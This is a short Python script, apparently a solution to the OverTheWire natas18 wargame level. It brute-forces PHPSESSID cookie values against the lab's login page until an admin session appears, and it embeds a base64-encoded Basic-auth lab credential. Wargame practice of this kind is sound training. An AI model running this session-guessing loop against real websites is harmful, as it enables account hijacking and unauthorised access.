import requests

for i in range(600, 9999999):
	url = 'http://natas18.natas.labs.overthewire.org/index.php'
	payload = {'username': 'admin', 'password': 'aa'}
	headers = {'Cookie': "PHPSESSID={0}".format(i), "Authorization": "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=="}

	r = requests.post(url, params=payload, headers=headers)
	if "Unauthorized" in r.text:
		print("Trying Session ID: " + str(i) + "......Fail")
	else:
		print("Admin session found! Session ID: " + str(i))
		print(r.text)
		exit()
